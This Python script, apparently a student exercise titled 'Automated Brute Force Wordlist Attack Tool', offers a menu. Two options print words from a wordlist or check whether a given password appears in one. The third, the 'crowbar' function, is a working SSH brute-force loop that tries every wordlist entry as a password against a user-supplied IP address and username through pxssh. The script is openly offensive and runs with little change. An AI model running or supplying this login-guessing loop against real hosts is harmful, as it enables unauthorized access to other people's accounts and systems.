#!/usr/bin/env python3

# Script Name:      Automated Brute Force Wordlist Attack Tool
# Author:           Vincent Bailey
# Last Rev:         10/26/2021
# Purpose:          This script will use word lists to search for passwords.

import sys, time, requests, getpass
from pexpect import pxssh

def startmenu():
    print ("1. Offensive: Dictionary Iterator")
    print ("2. Defensive: Password Search")
    print ("3. Offensive: Brute Force Attack")
    print ("4. Exit")
    selection = input("Enter Your Numbered Choice [1-4]: " )
    if selection == '1':
        offense()
    elif selection == '2':
        defense()
    elif selection == '3':
        crowbar()
    elif selection == '4':
        print("See you later!")
        time.sleep(1.6)
        sys.exit()
    else:
        print("That's definitely not one of the numbers here. Want to try again?")
    return selection

def offense():
    filepath = input("Please Enter a Filepath to a Word List: ")
    print(filepath)
    time.sleep(1.6)
    file = open(filepath, encoding = "ISO-8859-1")
    userLine = file.readline()
    while userLine:
        userLine = userLine.rstrip()
        word = userLine
        print(word)
        time.sleep(1.6)
        userLine = file.readline()
    file.close()
    time.sleep(1.6)
    print(userLine)

def defense():
    string = input("Please enter a password: ")
    wordPath = input("Please Enter a Filepath to a Word List: ")
    file = open(wordPath, encoding = "ISO-8859-1")
    userLine = file.readline()
    flag=0  # sets starting point for the list
    index=0
    for line in file:
        index+=1
        if string in line: # if the password matches the current line, break loop
            flag=1
            break

    if flag==1: # if the password was matched above, print confirmation and line number
        print("Gotcha! Password Found!","Line", index)
    file.close()
    time.sleep(1.6)

def connect(host,user,line):
    try:
        ssh=pxssh.pxssh()
        ssh.force_password=True
        ssh.login(host,user,line)
        print("Password Verified.")
        sys.exit(0)
    except pxssh.ExceptionPxssh as e:
        print(e)
    except KeyboardInterrupt as k:
        print("\n")
        print("Command Interrupted.")
        print("Stopped by user.")
        sys.exit(0)

def crowbar():
    s=pxssh.pxssh()
    address=input("Enter an IP Address: ")
    username=input("Enter a Username: ")
    path=input("Enter Path To Wordlist/Dictionary: ")
    file=open(path, "r", encoding="ISO-8859-1")
    for p in file.readlines():
        username=username.strip("\n")
        password=p.strip("\n")
        print(str(username) + ":" + str(password))
        connect(address,str(username),str(password))
    file.close()

startmenu()